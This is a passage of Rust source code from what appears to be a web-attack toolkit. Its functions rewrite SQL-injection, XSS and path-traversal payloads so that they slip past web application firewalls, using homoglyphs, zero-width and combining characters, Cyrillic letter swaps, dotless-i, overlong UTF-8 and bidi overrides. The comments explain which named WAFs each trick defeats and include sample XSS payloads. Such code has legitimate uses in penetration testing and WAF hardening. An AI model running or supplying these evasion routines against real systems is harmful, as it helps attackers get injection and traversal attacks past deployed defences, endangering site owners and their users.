        let mut closed = false;
        while let Some(&next) = chars.peek() {
            chars.next();
            if next == '\'' {
                if chars.peek() == Some(&'\'') {
                    literal.push('\'');
                    chars.next();
                    continue;
                }
                closed = true;
                break;
            }
            literal.push(next);
        }
        if !closed {
            out.push('\'');
            out.push_str(&literal);
            continue;
        }
        let lit_chars: Vec<char> = literal.chars().collect();
        if lit_chars.len() < 2 {
            // Length-0 or length-1 literal: pass through. Note for
            // length-1 with `'`: that's a literal containing a single
            // `'`, which we encode as `''''` (four-quote form) to keep
            // the output SQL-valid.
            out.push('\'');
            if lit_chars.len() == 1 && lit_chars[0] == '\'' {
                out.push_str("''");
            } else {
                out.push_str(&literal);
            }
            out.push('\'');
            continue;
        }
        // Single-character split: each char of the literal becomes its
        // own `'c'` quoted token, joined by single spaces. ANSI SQL-92
        // §5.3 concatenates them at parse time. Idempotent: each output
        // sub-literal has length 1 (below the threshold) so a second
        // pass sees only short literals and produces identical output.
        //
        // Escaped-quote handling: if the source literal contained a
        // SQL `''` escape it lives in `literal` as a single `'` char.
        // The shattered single-char literal for that position emits
        // `''''` (four-quote form: opening quote, escaped quote, escaped
        // quote, closing quote) so the database reassembles the
        // original `'` content. Idempotency holds because `''''` parses
        // as a length-1 literal containing `'` on the next pass.
        let mut first = true;
        for c in lit_chars {
            if !first {
                out.push(' ');
            }
            first = false;
            out.push('\'');
            if c == '\'' {
                out.push_str("''");
            } else {
                out.push(c);
            }
            out.push('\'');
        }
    }
    out
}

/// Homoglyph substitution, replaces select ASCII characters with visually
/// identical Unicode characters from other scripts.
///
/// **Bypass mechanism**: WAFs match `'`, `"`, `<`, `>`, `=`, etc. as literal
/// bytes. Unicode homoglyphs look identical in logs but aren't matched by
/// byte-level regex. If the backend performs Unicode normalization (NFKC) or
/// accepts these codepoints in SQL/HTML contexts, the payload executes.
///
/// **Context**: Effective against byte-level WAFs. Requires backend Unicode
/// tolerance (common in modern frameworks).
#[must_use]
pub fn homoglyph_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 4);
    for ch in payload.chars() {
        let mapped = match ch {
            // INTENTIONALLY NOT REPLACED: SQL string delimiters.
            // Pre-fix `'` → U+2019 and `"` → U+201D were mapped to
            // their right-single/double quotation marks. Those
            // codepoints are NOT recognised as string delimiters
            // by ANY SQL parser, they're treated as word
            // characters. The host query's string literal is never
            // closed, the injection context-break disappears, and
            // the payload becomes inert. Modern frameworks rarely
            // NFKC-normalise BEFORE the SQL parser sees the bytes,
            // so the assumption that this trick survives was wrong
            // in practice. Keep `'` and `"` ASCII; mutate only the
            // non-delimiter punctuation below.
            //
            // Comparison operators
            '<' => '\u{FF1C}', // FULLWIDTH LESS-THAN SIGN (＜)
            '>' => '\u{FF1E}', // FULLWIDTH GREATER-THAN SIGN (＞)
            '=' => '\u{FF1D}', // FULLWIDTH EQUALS SIGN (＝)
            // Punctuation
            '(' => '\u{FF08}', // FULLWIDTH LEFT PARENTHESIS (（)
            ')' => '\u{FF09}', // FULLWIDTH RIGHT PARENTHESIS (）)
            ';' => '\u{FF1B}', // FULLWIDTH SEMICOLON (；)
            '-' => '\u{2010}', // HYPHEN (‐)
            '/' => '\u{2215}', // DIVISION SLASH (∕)
            // Keep letters, digits, and delimiters unchanged.
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Inject zero-width / format characters between letters of `payload`.
///
/// `chars` selects which invisible char to insert; `positions` controls
/// where (every-other / per-keyword-letter / FNV-seeded). The output
/// is byte-distinct from the input but visually identical AND, for
/// `chars = ZERO_WIDTH_DEFAULTS`, semantically equivalent to most HTML
/// and SQL parsers (which strip U+200B–200D / U+FEFF on parse).
///
/// Sucuri-documented XSS bypass `&lt;scr​ipt&gt;alert(1)&lt;/scr​ipt&gt;`
/// uses U+200B between `scr` and `ipt`; the WAF regex `/script/i`
/// misses; the browser's HTML parser drops the ZWSP and renders.
///
/// Use [`ZERO_WIDTH_DEFAULTS`] for the recommended cycle of
/// [U+200B, U+200C, U+200D, U+FEFF, U+034F], rotating across these
/// per-position defeats WAFs that have hardcoded a single zero-width
/// stripper.
#[must_use]
pub fn zero_width_inject(payload: &str, invisible_char: char) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        out.push(ch);
        // Inject after every alphanumeric except the last char of the
        // string (so trailing context is preserved).
        if ch.is_ascii_alphanumeric() && chars.peek().is_some() {
            out.push(invisible_char);
        }
    }
    out
}

/// Recommended cycle of invisible characters for zero-width injection.
/// `[U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF BOM, U+034F CGJ]`.
pub const ZERO_WIDTH_DEFAULTS: [char; 5] =
    ['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}', '\u{034F}'];

/// Inject a combining diacritical mark after each letter of `payload`.
///
/// `s̈elect` (s + U+0308 COMBINING DIAERESIS + elect) reads as `select`
/// after NFC normalisation (Python `unicodedata.normalize('NFC', x)`,
/// Java `Normalizer.normalize(s, NFC)`) but the WAF regex `/select/`
/// sees a different byte sequence and misses.
///
/// Common safe marks (no NFC reflow, just stripped by char-walk
/// readers): U+0300 grave, U+0301 acute, U+0308 diaeresis, U+0327
/// cedilla. U+034F COMBINING GRAPHEME JOINER is the most invisible
/// (zero width, no visual diacritic), so it's the default.
#[must_use]
pub fn combining_mark_inject(payload: &str, mark: char) -> String {
    let mut out = String::with_capacity(payload.len() * 3);
    for ch in payload.chars() {
        out.push(ch);
        if ch.is_ascii_alphabetic() {
            out.push(mark);
        }
    }
    out
}

/// Cross-script Cyrillic / Greek letter substitution.
///
/// Unlike [`homoglyph_encode`] (punctuation-only by design),
/// `script_homoglyph_encode` substitutes the *letters* themselves
/// with visually-identical codepoints from Cyrillic + Greek scripts
/// that the WAF regex sees as different bytes. Two sub-classes:
///
/// 1. **Non-normalising** (Cyrillic ѕ U+0455, е U+0435, о U+043E,
///    а U+0430; Greek ο U+03BF, ν U+03BD, …), backend and WAF both
///    see different codepoints, but MSSQL's implicit Unicode→varchar
///    coercion maps Cyrillic lookalikes to ASCII via collation
///    (`SQL_Latin1_General_CP1_CI_AI`).
/// 2. **NFKC-normalising**: letterlike block letters (already covered
///    by `letterlike_encode`).
///
/// This function targets class 1 only, for class 2 use
/// [`letterlike_encode`] / `math_*_encode`.
#[must_use]
pub fn script_homoglyph_encode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for ch in payload.chars() {
        let mapped = match ch {
            // Cyrillic lowercase lookalikes.
            'a' => '\u{0430}', // CYRILLIC SMALL LETTER A
            'c' => '\u{0441}', // CYRILLIC SMALL LETTER ES
            'e' => '\u{0435}', // CYRILLIC SMALL LETTER IE
            'o' => '\u{043E}', // CYRILLIC SMALL LETTER O
            'p' => '\u{0440}', // CYRILLIC SMALL LETTER ER
            's' => '\u{0455}', // CYRILLIC SMALL LETTER DZE
            'x' => '\u{0445}', // CYRILLIC SMALL LETTER HA
            'y' => '\u{0443}', // CYRILLIC SMALL LETTER U
            // Cyrillic uppercase lookalikes.
            'A' => '\u{0410}',
            'B' => '\u{0412}',
            'C' => '\u{0421}',
            'E' => '\u{0415}',
            'H' => '\u{041D}',
            'K' => '\u{041A}',
            'M' => '\u{041C}',
            'O' => '\u{041E}',
            'P' => '\u{0420}',
            'T' => '\u{0422}',
            'X' => '\u{0425}',
            // Greek lookalikes for remaining letters.
            'n' => '\u{03B7}', // GREEK SMALL LETTER ETA
            'v' => '\u{03BD}', // GREEK SMALL LETTER NU
            c => c,
        };
        out.push(mapped);
    }
    out
}

/// Turkish dotless-i substitution: replace `i`/`I` with U+0131/U+0130.
///
/// U+0131 LATIN SMALL LETTER DOTLESS I does NOT ASCII-uppercase to `I`
/// (it only uppercases to `I` in Turkish locale). A WAF that performs
/// ASCII case-fold via Lua `string.lower` or PHP `strtolower` (CRS
/// default) misses `scrıpt` when looking for `script`. The HTML5 spec
/// requires browsers to normalise U+0131 to `i` in tag names, so
/// `&lt;scrıpt&gt;alert(1)&lt;/scrıpt&gt;` renders as a script tag.
///
/// CVE-class: GitHub auth byass via Turkish dotless-i (dev.to 2018).
#[must_use]
pub fn turkish_i_encode(payload: &str) -> String {
    payload
        .chars()
        .map(|ch| match ch {
            'i' => '\u{0131}',
            'I' => '\u{0130}',
            c => c,
        })
        .collect()
}

/// Sharp-s (ß U+00DF) substitution for `s`/`S`.
///
/// ß lowercases to itself in most locales, but Unicode FULL case-fold
/// (`str::to_lowercase` in Rust, `str.casefold()` in Python) maps the
/// CAPITAL letter sharp s `ẞ` (U+1E9E) to `ss`. WAFs that case-fold
/// before regex see different byte sequence; backends with full
/// Unicode casefold reach the same `script` / `select`. Narrower
/// applicability than [`turkish_i_encode`].
#[must_use]
pub fn sharp_s_encode(payload: &str) -> String {
    payload
        .chars()
        .map(|ch| match ch {
            's' | 'S' => '\u{00DF}', // ß
            c => c,
        })
        .collect()
}

/// AWS WAF JSON-pointer escape, encode every char of `key` as
/// `\uXXXX` so the WAF's JSON-pointer rule (e.g. `/id` literal-match)
/// misses, while the backend JSON parser decodes the escape and
/// routes the value to the original field.
///
/// Returns the JSON fragment `{"<key-escaped>": "<value>"}` ready to
/// drop into a request body. Sicuranext 2024 confirmed bypass.
#[must_use]
pub fn json_key_unicode_escape(key: &str, value: &str) -> String {
    let mut escaped_key = String::with_capacity(key.len() * 6);
    for ch in key.chars() {
        let cp = ch as u32;
        if cp <= 0xFFFF {
            escaped_key.push_str(&format!("\\u{:04x}", cp));
        } else {
            // Surrogate pair for non-BMP codepoints.
            let v = cp - 0x10000;
            let hi = 0xD800 + (v >> 10);
            let lo = 0xDC00 + (v & 0x3FF);
            escaped_key.push_str(&format!("\\u{:04x}\\u{:04x}", hi, lo));
        }
    }
    // Value goes through JSON-safe encode (the existing helper).
    let value_json = serde_json::to_string(value).unwrap_or_else(|_| format!("\"{value}\""));
    format!("{{\"{escaped_key}\": {value_json}}}")
}

/// Overlong UTF-8 encoding of `.` and `/` for path traversal.
///
/// CRS GitHub issue #4189 (opened 2025-07, still open). CRS does
/// not alert on `%c0%ae%c0%ae%c0%af` (`../` in 2-byte overlong UTF-8).
/// Servers that strictly decode UTF-8 reject these as malformed; older
/// JVMs, some C libs (CVE-2017-9805 Struts2), and a non-trivial set
/// of internal services accept them. WAF gap + permissive backend =
/// path traversal that the WAF doesn't see.
///
/// `width` selects the overlong representation: 2 (default), 3, or 4
/// bytes. Each level is independently checked by some decoders, so a
/// 3-byte overlong may pass where a 2-byte one is filtered.
#[must_use]
pub fn overlong_utf8_path(path: &str, width: u8) -> String {
    let dot = match width {
        2 => "%c0%ae",
        3 => "%e0%80%ae",
        _ => "%f0%80%80%ae", // 4-byte default for unknown width
    };
    let slash = match width {
        2 => "%c0%af",
        3 => "%e0%80%af",
        _ => "%f0%80%80%af",
    };
    let bs = match width {
        2 => "%c0%5c",
        3 => "%e0%80%5c",
        _ => "%f0%80%80%5c",
    };
    // §1 SPEED: replaced `.map(|c| c.to_string()).collect::<String>()` which
    // allocates one String per character with a push-loop into a pre-sized
    // buffer. The three special chars map to static string slices; all other
    // codepoints push directly. No heap allocation per character.
    let mut out = String::with_capacity(path.len() * slash.len());
    for c in path.chars() {
        match c {
            '.' => out.push_str(dot),
            '/' => out.push_str(slash),
            '\\' => out.push_str(bs),
            c => out.push(c),
        }
    }
    out
}

/// Bidi override wrapper, wraps `reversed_keyword` between U+202E
/// (RIGHT-TO-LEFT OVERRIDE) and U+202C (POP DIRECTIONAL FORMATTING).
///
/// The WAF scans left-to-right byte order: it sees `tceleS`. Rendered
/// text in a BiDi-aware viewer (e.g. browser, IDE, security analyst's
/// dashboard) shows `Select`. CVE-2021-42574 (Trojan Source) class.
///
/// **Narrow direct bypass surface**: most SQL parsers reject bare
/// U+202E. Useful primarily for WAF log poisoning and rule-auditing
/// tool confusion; some template engines do strip bidi chars before
/// forwarding, in which case the reversed payload becomes live.
#[must_use]
pub fn bidi_inject(reversed_keyword: &str) -> String {
    format!("\u{202E}{reversed_keyword}\u{202C}")
}

#[cfg(test)]
#[path = "unicode_tests.rs"]
mod tests;
